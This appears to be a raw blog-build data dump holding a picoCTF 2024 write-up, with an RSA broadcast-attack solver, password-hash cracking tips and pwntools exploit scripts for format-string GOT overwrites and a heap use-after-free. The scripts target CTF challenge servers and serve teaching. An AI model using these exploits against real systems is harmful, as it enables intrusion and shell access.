style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Given values\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">e \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">c1 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">105001824161664003599422656864176455171381720653815905925856548632486703162518989165039084097502312226864233302621924809266126953771761669365659646250634187967109683742983039295269237675751525196938138071285014551966913785883051544245059293702943821571213612968127810604163575545004589035344590577094378024637\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">c2 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">31631442837619174301627703920800905351561747632091670091370206898569727230073839052473051336225502632628636256671728802750596833679629890303700500900722642779064628589492559614751281751964622696427520120657753178654351971238020964729065716984136077048928869596095134253387969208375978930557763221971977878737\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">c3 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">64864977037231624991423831965394304787965838591735479931470076118956460041888044329021534008265748308238833071879576193558419510910272917201870797698253331425756509041685848066195410586013190421426307862029999566951239891512032198024716311786896333047799598891440799810584167402219122283692655717691362258659\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n1 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">147896270072551360195753454363282299426062485174745759351211846489928910241753224819735285744845837638083944350358908785909584262132415921461693027899236186075383010852224067091477810924118719861660629389172820727449033189259975221664580227157731435894163917841980802021068840549853299166437257181072372761693\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n2 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">95979365485314068430194308015982074476106529222534317931594712046922760584774363858267995698339417335986543347292707495833182921439398983540425004105990583813113065124836795470760324876649225576921655233346630422669551713602423987793822459296761403456611062240111812805323779302474406733327110287422659815403\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n3 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\"> int\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">95649308318281674792416471616635514342255502211688462925255401503618542159533496090638947784818456347896833168508179425853277740290242297445486511810651365722908240687732315319340403048931123530435501371881740859335793804194315675972192649001074378934213623075830325229416830786633930007188095897620439987817\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">#\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Applying Chinese Remainder Theorem\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n1 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n2 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n1_inv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> mod_inverse\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n1\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n2_inv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> mod_inverse\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n2\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">n3_inv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> mod_inverse\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\"> n3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">C \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (c1 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n1_inv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n1) \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> c2 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n2_inv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n2) \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">+\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> c3 \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n3_inv \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> (N \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">//\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> n3)) \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">%\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> N\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">m\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">,\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> exact \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\"> iroot\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">C\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D9F5DD\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 3\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> exact\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">    print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">f\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"The hidden message is: \u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">{\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">m\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">}\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">    print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Failed to recover the hidden message.\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Ch2 id=\"forensics\">Forensics\u003C/h2>\n\u003Ch4 id=\"babys-first-foren\">Baby’s First Foren\u003C/h4>\n\u003Cp>Looking throughout the HTTP object yields the strange phrase \u003Ccode>nikto\u003C/code>. Upon further research, nikto is a web vulnerability scanner\u003C/p>\n\u003Cp>Following the tcp stream and searching for \u003Ccode>nikto\u003C/code> yeilds the version.\u003C/p>\n\u003Ch4 id=\"sam-i-am\">SAM I AM\u003C/h4>\n\u003Cp>Use a tool like \u003Ccode>samdump2 system.bak sam.bak\u003C/code> and get the password hashes. Then crack the NT hashes using \u003Ccode>john\u003C/code> and get the password\u003C/p>",{"headings":169,"imagePaths":196,"frontmatter":157},[170,171,172,175,178,181,184,187,190,193],{"depth":26,"slug":27,"text":28},{"depth":30,"slug":115,"text":116},{"depth":34,"slug":173,"text":174},"parrot-the-emu","Parrot The Emu",{"depth":34,"slug":176,"text":177},"zoo-feedback-form","Zoo Feedback Form",{"depth":30,"slug":179,"text":180},"crypto","Crypto",{"depth":34,"slug":182,"text":183},"shufflebox","ShuffleBox",{"depth":34,"slug":185,"text":186},"sun-tzus-perfect-math-class","Sun Tzu’s Perfect Math Class",{"depth":30,"slug":188,"text":189},"forensics","Forensics",{"depth":34,"slug":191,"text":192},"babys-first-foren","Baby’s First Foren",{"depth":34,"slug":194,"text":195},"sam-i-am","SAM I AM",[],"picoctf-2024",{"id":197,"data":199,"body":205,"filePath":206,"digest":207,"rendered":208},{"author":12,"pubDatetime":200,"modDatetime":201,"title":202,"tags":203,"description":204},["Date","2022-03-23T15:22:00.000Z"],["Date","2023-12-21T09:12:47.400Z"],"picoctf 2024",[51],"Here is the solutions to some of the challenges in picoctf 2024","# Background Information\nI participated in picoCTF 2024 with the team Cyber Thugs. We placed 24th in the United States with a score of 6925. This competition definitely was fun. Challenges were not too complex, but there was always something that kept my time from solving. Hopefully picoCTF 2025 will be better :prayer:\n\n*** UPDATE ***\nIm only posting pwn. Cus im lazy.\n\n## Binary Exploitation\n### Format String 2\n\n> This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack! \n>\n> Download the binary here. \n>\n> Download the source here.\n\nThis challenge asks us to utilize the format string exploit to write arbitrary data from the stack. Let's read the code first: \n\n```c\n#include \u003Cstdio.h>\n\nint sus = 0x21737573;\n\nint main() {\n  char buf[1024];\n  char flag[64];\n\n\n  printf(\"You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\\n\");\n  fflush(stdout);\n  scanf(\"%1024s\", buf);\n  printf(\"Here's your input: \");\n  printf(buf);\n  printf(\"\\n\");\n  fflush(stdout);\n\n  if (sus == 0x67616c66) {\n    printf(\"I have NO clue how you did that, you must be a wizard. Here you go...\\n\");\n\n    // Read in the flag\n    FILE *fd = fopen(\"flag.txt\", \"r\");\n    fgets(flag, 64, fd);\n\n    printf(\"%s\", flag);\n    fflush(stdout);\n  }\n  else {\n    printf(\"sus = 0x%x\\n\", sus);\n    printf(\"You can do better!\\n\");\n    fflush(stdout);\n  }\n\n  return 0;\n}\n```\n\nSo what we can see here is that it checks if `sus` is equal to `0x67616c66`. However, what we can see is that `sus` is hardcoded to `0x21737573`, which means we need to find a way to overwrite sus to pass the condition.\n\nSo basically, here is plan:\n\n-> Use a basic format string with A's and `%p` pointer to leak data from the program\n\n-> This program is in x64, so we need to make sure we use 8 A's to fill out the stack frame. \n\n-> We will use the %p format to leak pointers in the format string\n\n-> Here's our basic payload: `AAAAAAAA%p-%p-%p ...` we will repeat the use of `%p` to leak pointer addresses to find how many arguments we need.\n\n->  We then will send a format string payload with the address of `sus`, the format string argument(s), the value of `0x67616c66`.\n\n-> We will use pwntools to send the payload to the elf and pass the check, which will give us flag.\n\nSo let's get started.\n\n![Image of info leak](/img/writeups/2024/picoCTF2024/formatstring02.png)\n\nWow! Lots of data! If we look closely we can see a pointer with the value of `0x4141414141414141` this must be where our input is stored on the stack.\n\nCounting towards that pointer we get a argument amount of 14. Let's find the address of `sus`.\n\nLuckily pwntools will give the address of `sus` through the python code `elf.symbols['sus']`\n\nLet's put this into a solve script:\n\nWait? How does this work?\n\nBasically, when we send the format string payload, pwntools will turn the address of `sus` as a pointer, and then write the value we give to it to that pointer, basically overwriting whatever initial value `sus` had. \n\n```python\nfrom pwn import *\nfrom pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split\n\ncontext.binary='vuln'\nelf = ELF('./vuln')\nlibc = elf.libc\n\nif args.REMOTE:\n#change this on your own remote instance\n\tp = remote('rhea.picoctf.net', 61865)\nelse:\n\tp = process(elf.path)\n\ndef send_payload(payload):\n\tp.sendline(payload)\n\tp.interactive()\n\naddress = elf.symbols['sus']\nprint(address)\nvalue = 0x67616c66   # this is the value admin needs to be\nprint(value)\n#overwriting the sus address with the value we want\npayload = fmtstr_payload(14, {address: value})\np.sendlineafter(b'say?', payload)\np.recvuntil(b'I have NO clue')\np.interactive()\nprint(p.recvuntil('?'))\n```\nRunning this we get success! Please check on your own remote instance. \n\n![Image of exploit success](/img/writeups/2024/picoCTF2024/formatstring02-1.png)\n\nResources: \n\n\n\n### Heap 3\n> This program mishandles memory. Can you exploit it to get the flag? \n>\n> Download the binary here.\n>\n> Download the source here.\n>\n> Connect with the challenge instance here: nc tethys.picoctf.net 65312\n\nThis problem was intially a bit confusing, but in retrospect it was pretty easy. \n\nThe problem gives us this hint: `Check out \"use after free\"`\n\nHmmm... what could \"use after free\" possibly mean and how does it relate to heap overflow?\nHeres the definition of \"use after free\":\n\n```Once free is called on an allocation, the allocator is free to re-allocate that chunk of memory in future calls to malloc if it so chooses. However if the program author isn't careful and uses the freed object later on, the contents may be corrupt (or even attacker controlled). This is called a use after free or UAF.```\n\nLet's read the source code. \n\n```c\n#include \u003Cstdio.h>\n#include \u003Cstdlib.h>\n#include \u003Cstring.h>\n\n#define FLAGSIZE_MAX 64\n\n// Create struct size 35\ntypedef struct {\n  char a[10];\n  char b[10];\n  char c[10];\n  char flag[5]; //we have to modify this \"area\" from bico to pico\n} object;\n\nint num_allocs;\nobject *x;\n\nvoid check_win() {\n//just need to change it from bico to pico\n  if(!strcmp(x->flag, \"pico\")) {\n    printf(\"YOU WIN!!11!!\\n\");\n\n    // Print flag\n    char buf[FLAGSIZE_MAX];\n    FILE *fd = fopen(\"flag.txt\", \"r\");\n    fgets(buf, FLAGSIZE_MAX, fd);\n    printf(\"%s\\n\", buf);\n    fflush(stdout);\n\n    exit(0);\n\n  } else {\n    printf(\"No flage for u :(\\n\");\n    fflush(stdout);\n  }\n  // Call function in struct\n}\n\nvoid print_menu() {\n    printf(\"\\n1. Print Heap\\n2. Allocate object\\n3. Print x->flag\\n4. Check for win\\n5. Free x\\n6. \"\n           \"Exit\\n\\nEnter your choice: \");\n    fflush(stdout);\n}\n\n// Create a struct\nvoid init() {\n\n    printf(\"\\nfreed but still in use\\nnow memory untracked\\ndo you smell the bug?\\n\");\n    fflush(stdout);\n\n    x = malloc(sizeof(object));\n    strncpy(x->flag, \"bico\", 5);\n}\n\nvoid alloc_object() {\n    printf(\"Size of object allocation: \");\n    fflush(stdout);\n    int size = 0;\n    scanf(\"%d\", &size);\n    char* alloc = malloc(size);\n    printf(\"Data for flag: \");\n    fflush(stdout);\n    scanf(\"%s\", alloc);\n}\n\nvoid free_memory() {\n    free(x);\n}\n\nvoid print_heap() {\n    printf(\"[*]   Address   ->   Value   \\n\");\n    printf(\"+-------------+-----------+\\n\");\n    printf(\"[*]   %p  ->   %s\\n\", x->flag, x->flag);\n    printf(\"+-------------+-----------+\\n\");\n    fflush(stdout);\n}\n\nint main(void) {\n\n    // Setup\n    init();\n\n    int choice;\n\n    while (1) {\n        print_menu();\n\tif (scanf(\"%d\", &choice) != 1) exit(0);\n\n        switch (choice) {\n        case 1:\n            // print heap\n            print_heap();\n            break;\n        case 2:\n            alloc_object();\n            break;\n        case 3:\n            // print x\n            printf(\"\\n\\nx = %s\\n\\n\", x->flag);\n            fflush(stdout);\n            break;\n        case 4:\n            // Check for win condition\n            check_win();\n            break;\n        case 5:\n            free_memory();\n            break;\n        case 6:\n            // exit\n            return 0;\n        default:\n            printf(\"Invalid choice\\n\");\n            fflush(stdout);\n        }\n    }\n}\n```\nLet's see what goes on in the code. So our objective is to get to the `check_win()` function. However, this can only be achieved if the variable `x` equals to `pico`, and `x` has been set to `bico`.\n\nWe also see other cases, such as `print_heap`, `alloc_object()` and `free_memory()`. Let's try to think of a solution. \n\nFurther up we can see a struct being created. \n```c\ntypedef struct {\n  char a[10];\n  char b[10];\n  char c[10];\n  char flag[5]; //we have to modify this \"area\" from bico to pico\n} object;\n```\n\nThis struct and the functions `alloc_object()` and `free_memory()` will allow us to change `x` to `pico`! \n\nHere's our steps:\n\n1. Allocate memory of size 35 (size of struct) with random garbage. \n2. Free this garbage \n3. Allocate memory of size 35 with random garbage but overflow with the last 5 characters being `pico` and the null byte\n4. Somehow this confused the program and it will use those last 5 bytes as x. \n\nLet's see this in action: \n\n![Image of exploit success](/img/writeups/2024/picoCTF2024/heap3.png)\n\nWow! So simple!\n\n### Format String 3\n\n> This program doesn't contain a win function. How can you win? \n>\n> Download the binary here. \n>\n> Download the source here. \n>\n> Download libc here, download the interpreter here. \n>\n> Run the binary with these two files present in the same directory.\n>\n> Additional details will be available after launching your challenge instance.\n\nThis one's pretty simple because it basically is format string 2, just a little bit more complicated.\n\nThe hint says: `Is there any way to change what a function points to?`. This must mean we need to overwrite a function to point to something else.\n\nLet's read the source code provided:\n\n```c\n#include \u003Cstdio.h>\n\n#define MAX_STRINGS 32\n\nchar *normal_string = \"/bin/sh\";\n\nvoid setup() {\n\tsetvbuf(stdin, NULL, _IONBF, 0);\n\tsetvbuf(stdout, NULL, _IONBF, 0);\n\tsetvbuf(stderr, NULL, _IONBF, 0);\n}\n\nvoid hello() {\n\tputs(\"Howdy gamers!\");\n\tprintf(\"Okay I'll be nice. Here's the address of setvbuf in libc: %p\\n\", &setvbuf);\n}\n\nint main() {\n\tchar *all_strings[MAX_STRINGS] = {NULL};\n\tchar buf[1024] = {'\\0'};\n\n\tsetup();\n\thello();\t\n\n\tfgets(buf, 1024, stdin);\t\n\tprintf(buf);\n\n\tputs(normal_string);\n\n\treturn 0;\n}\n\n```\n\nhmm... interesting. It says it gives the address of `setvbuf` in libc, and it does the `puts`function with `normal_string`, with `normal_string` being `/bin/sh`. \n\nAfter a bit of research, it appears we need to overwrite the address of `puts()` with `system()`, so we can pop a shell to access the server. However, there's a huge problem. How do we even get `system()`???\n\nGetting `puts` is easy. It's in the Global Offset Table (GOT), so we don't really need to worry about that. \n\nWe can try to find system() in libc, however there's a huge problem. The binary has ASLR. \n\nASLR stands for Address Space Layout Randomisation and can, in most cases, be thought of as libc's equivalent of PIE - every time you run a binary, libc (and other libraries) get loaded into a different memory address.\n\nThis is a problem. How can we get address of `system()` if we can't even get a constant address for `system()` in libc???\n\nThis is where the leak of `setvbuf` in libc comes in. \n\nWe can caculate the base address of libc by subtracting the leaked address of `setvbuf` by the offset of `setvbuf` in libc. \n\nOk, so with that we can add the offset of `system` in libc to the base address. So we are able to get `system`, nice!\n\nHeres the steps of our exploit:\n\n1. subtract leaked setvbuf by setvbuf offset in libc to get libc base address\n2. add offset of system in libc to the base address to get the address of system\n3. get the address of puts in the GOT and replace it with the address of system using format string\n4. use pwntools to automate this process\n5. log in and get flag!\n\n```python\nfrom pwn import *\nfrom pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split\n\nelf = context.binary = ELF('./format-string-3')\nlibc = ELF('./libc.so.6')\n#get base address from setvbuf using leaked setvbuf\n\nif args.REMOTE:\n\n\tp = remote('rhea.picoctf.net', 61909)\nelse:\n\tp = process(elf.path)\n\ndef send_payload(payload):\n\tp.sendline(payload)\n\tp.interactive()\n\nprint(p.recvline())\n\nsystem_leak = int(((p.recvline()).split()[11]), 16)\n\nprint((system_leak))\n\n#get the libc.address through system leak\nlibc_address = (system_leak-libc.symbols['setvbuf'])\n\nsystem = (libc_address + libc.symbols['system'])\n\npayload = fmtstr_payload(38, {elf.got['puts']: system})\n\np.sendline(payload)\np.interactive()\n\n```\n\n![Image of exploit success](/img/writeups/2024/picoCTF2024/formatstring03.png)\n\nAnd... we get the flag! \n\n\n","src/content/blog/picoCTF-2024.md","3ba39a6f572f846f",{"html":209,"metadata":210},"\u003Ch1 id=\"background-information\">Background Information\u003C/h1>\n\u003Cp>I participated in picoCTF 2024 with the team Cyber Thugs. We placed 24th in the United States with a score of 6925. This competition definitely was fun. Challenges were not too complex, but there was always something that kept my time from solving. Hopefully picoCTF 2025 will be better :prayer:\u003C/p>\n\u003Cp>*** UPDATE ***\nIm only posting pwn. Cus im lazy.\u003C/p>\n\u003Ch2 id=\"binary-exploitation\">Binary Exploitation\u003C/h2>\n\u003Ch3 id=\"format-string-2\">Format String 2\u003C/h3>\n\u003Cblockquote>\n\u003Cp>This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!\u003C/p>\n\u003Cp>Download the binary here.\u003C/p>\n\u003Cp>Download the source here.\u003C/p>\n\u003C/blockquote>\n\u003Cp>This challenge asks us to utilize the format string exploit to write arbitrary data from the stack. Let’s read the code first:\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">include\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">stdio.h\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan 